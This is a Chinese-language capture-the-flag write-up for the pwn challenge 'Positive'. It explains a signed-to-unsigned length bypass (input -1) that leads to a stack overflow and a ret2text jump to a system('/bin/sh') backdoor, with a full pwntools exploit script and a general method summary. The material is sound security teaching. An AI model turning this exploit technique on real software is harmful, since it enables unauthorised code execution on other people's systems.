# Positive

## 题目简述

64 位 ELF 无 PIE、无 Canary，NX 开启。程序先读取一个十进制长度并转为有符号 `int`，只拒绝大于 `0x10` 的值；随后却把该值装入 `edx`，作为 `read()` 的无符号 `size_t` 长度，向 0x30 字节栈缓冲区读数据。二进制还包含调用 `system("/bin/sh")` 的 `whaaaaaat()` 后门。

## 解题过程

输入 `-1` 时，有符号比较认为它不大于 `0x10`，但进入 `read()` 后会按无符号值解释为 `0xffffffff`。这不要求实际发送 4 GiB 数据，只是取消了有效长度限制，使有限 payload 也能覆盖返回地址。

栈缓冲区大小为 `0x30`，其后是 8 字节保存的 `rbp`，所以到返回地址的偏移为 `0x38`。程序无 PIE，后门与对齐用 `ret` 地址固定：

```text
ret      = 0x401280
backdoor = 0x40126a
```

连接参数由 `HOST`、`PORT` 环境变量提供，完整利用如下：

```python
import os
from pwn import *

context.arch = "amd64"
HOST = os.environ["HOST"]
PORT = int(os.environ["PORT"])
io = remote(HOST, PORT)

io.sendlineafter(b"walk:", b"-1")

payload = flat(
    b"A" * 0x38,
    0x401280,  # ret：修正 system() 调用前的栈对齐
    0x40126a,  # whaaaaaat -> system("/bin/sh")
)
io.sendafter(b"walking:", payload)
io.interactive()
```

额外的 `ret` 让 x86-64 栈在进入 glibc `system()` 时满足 16 字节对齐要求。取得 shell 后读取题目环境中的 flag 文件即可。仓库压缩包只包含二进制 `dist/pwn`，没有保存比赛实例中的 flag，因此不补写无法核验的固定字符串。

## 方法总结

- 核心技巧：利用有符号长度检查与无符号 `size_t` 之间的整数转换绕过限制，再执行 ret2text。
- 识别信号：长度变量是有符号整数、只检查上界或“必须为正”，随后直接传给 `read`、`memcpy` 等无符号长度参数。
- 复用要点：负数转为无符号后会变成极大值；计算溢出偏移时仍按实际栈布局，并留意调用 libc 函数前的栈对齐。
